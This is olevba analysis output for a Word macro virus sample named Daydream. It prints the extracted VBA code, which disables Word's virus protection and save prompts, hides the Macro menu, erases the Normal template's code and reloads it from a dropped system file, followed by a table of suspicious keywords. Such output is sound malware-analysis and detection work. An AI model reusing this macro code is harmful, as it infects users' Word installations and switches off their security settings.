olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Daydream-d2bc16f03b74949c943948650f48eacf92ff0324
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Daydream-d2bc16f03b74949c943948650f48eacf92ff0324 
in file: Virus.MSWord.Daydream-d2bc16f03b74949c943948650f48eacf92ff0324 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set Daydream = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")
Daydream.Options.VirusProtection = (0 - 0):Daydream.Options.SaveNormalPrompt = (1 - 1):Daydream.Options.ConfirmConversions = (2 - 2)
Daydream.CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Visible = (3 - 3)
For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.sys" & Chr(34) & ")
Daydream.Application.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

